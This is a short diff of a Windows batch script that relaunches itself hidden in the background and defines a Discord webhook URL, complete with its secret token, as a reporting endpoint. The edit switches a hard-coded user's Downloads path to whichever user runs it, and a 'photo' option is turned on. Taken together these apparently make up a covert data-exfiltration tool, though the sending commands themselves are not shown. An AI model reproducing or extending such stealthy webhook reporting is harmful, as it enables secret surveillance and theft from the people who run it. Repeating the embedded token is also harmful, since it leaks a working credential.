@@ -1,8 +1,8 @@
 @echo off
 if not "%1"=="hide" start /B cmd /c "%~0" hide & exit
 setlocal enabledelayedexpansion
-::salute num 333
-set debutchemin=C:\Users\Aubin\Downloads\
+::salute num 444
+set debutchemin=C:\Users\%username%\Downloads\
 
 :: 📌 Définition des variables
 set WEBHOOK_URL=https://discord.com/api/webhooks/1334179975577862215/FQLGLyudyE8QhYH4OS9MoH-5970K2FU1Ug3tCZ0x7KdWJHHjVMXnSjzSsrOdL8yIGfEo
@@ -22,7 +22,7 @@ set DESTINATION=WebHook.bat
 
 
 
-set version=2025-01-31T19
+set version=2025-01-31T20
 
 
 set photo=true
